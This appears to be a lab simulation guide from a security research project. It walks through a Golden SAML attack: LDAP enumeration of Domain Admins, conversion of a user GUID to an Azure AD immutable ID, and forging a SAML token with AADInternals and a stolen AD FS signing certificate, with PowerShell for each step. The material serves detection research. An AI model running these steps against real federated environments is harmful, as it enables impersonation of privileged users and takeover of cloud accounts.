# Forge SAML Tokens

If a threat actor gets to [decrypt and export the AD FS token signing certificate](../export-adfs-certificates/README.md), the certificate can be used to sign new SAML tokens and impersonate users in a federated environment. 

## Table of Contents

* [Preconditions](#preconditions)
* [Simulation Steps](#simulation-steps)
* [Output](#output)
* [References](#references)

## Preconditions

* Integrity level: medium
* Authorization:
    * Resource: Domain Controller 
    * Identity:
        * Domain Users
* Domain Controller
    * Services:
      * Active directory domain services
    * Network:
      * Port: 389
* Input:
  * AD FS Token Signing Certificate

## Simulation Steps

### Enumerate Privileged Accounts via Lightweight Directory Access Protocol (LDAP)

Start by identifying privileged accounts that could also have privileged access to resources in the cloud. Usually, environments add their domain admin accounts to the Azure AD built-in  Global Administrator role. Therefore, you can start by enumerating the members of the `Domain Admins` group.

1.  Connect to a domain joined endpoint via the [Azure Bastion service](../../../../environments/_helper-docs/connectAzVmAzBastion.md).
2.  Open PowerShell and run the following commands:

```PowerShell
# Get Domain Name
$DomainName = (Get-WmiObject Win32_ComputerSystem).Domain 
$arr = ($DomainName).split('.')
$DNDomain = [string]::Join(",", ($arr | % { "DC={0}" -f $_ }))

# Create LDAP Search
$ADSearch = New-Object System.DirectoryServices.DirectorySearcher
$ADSearch.SearchRoot = "LDAP://$DomainName/$DNDomain"
$ADSearch.Filter = "(&(objectCategory=user)(memberOf=CN=Domain Admins,CN=Users,$DNDomain))"
$ADUsers = $ADSearch.FindAll()
$Results = @()

# Process Results
ForEach($ADUser in $ADUsers){
  If($ADUser){
    $Object = New-Object PSObject -Property @{
      Samaccountname = ($ADUser.Properties).samaccountname
      ObjectGuid  = ([guid]($ADUser.Properties).objectguid[0]).guid
    }
    $Results += $Object
  }
}
# Display results
$Results | Format-Table Samaccountname,ObjectGuid
```

![](../../../../images/labs/goldemsaml/signSAMLToken/2021-05-19_01_get_domain_admins.png)

### Forge SAML Token

A threat actor would most likely do this outside of the organization. Therefore, there are no detections for this step.

#### Convert User AD Object GUID to its Azure AD Immutable ID representation

1.  Once we identify the privileged user we want to impersonate, we need to obtain the `immutable ID` of the account AD object GUID. The `ImmutableId` is the base64-encoded representation of a domain user GUID in Azure AD.

```PowerShell
$Results[1].Samaccountname
$Results[1].ObjectGuid
$ObjectGUID = $Results[1].ObjectGuid
$ImmutableId = [convert]::ToBase64String(([guid]$ObjectGUID).ToByteArray())
$ImmutableId
```

![](../../../../images/labs/goldemsaml/signSAMLToken/2021-05-19_02_get_immutable_id.png)

#### Install AADInternals

2.  On the same PowerShell session, run the following commands to install [AADInternals](https://github.com/Gerenios/AADInternals) if it is not installed yet: 

```PowerShell
Install-Module –Name AADInternals -Force 
Import-Module –Name AADInternals
```

#### Sign a New SAML Token

3. Use the [New-AADIntSAMLToken](https://github.com/Gerenios/AADInternals/blob/master/FederatedIdentityTools.ps1#L6) function with the following information to sign a new SAML token:
  * The `ImmutableID` we got in the first section.
  * The path to the token signing certificate file.
  * The AD FS token issuer url.

```PowerShell 
$Cert = 'C:\ProgramData\ADFSSigningCertificate.pfx'
$Issuer = 'http://simulandlabs.com/adfs/services/trust/'
$SamlToken = New-AADIntSAMLToken -ImmutableID $ImmutableId -PfxFileName $Cert -PfxPassword "" -Issuer $Issuer
$SamlToken
```

![](../../../../images/labs/goldemsaml/signSAMLToken/2021-05-19_04_sign_saml_token.png)

## Output

* SAML Token

## References

* [Exporting ADFS certificates revisited: Tactics, Techniques and Procedures (o365blog.com)](https://o365blog.com/post/adfs/)
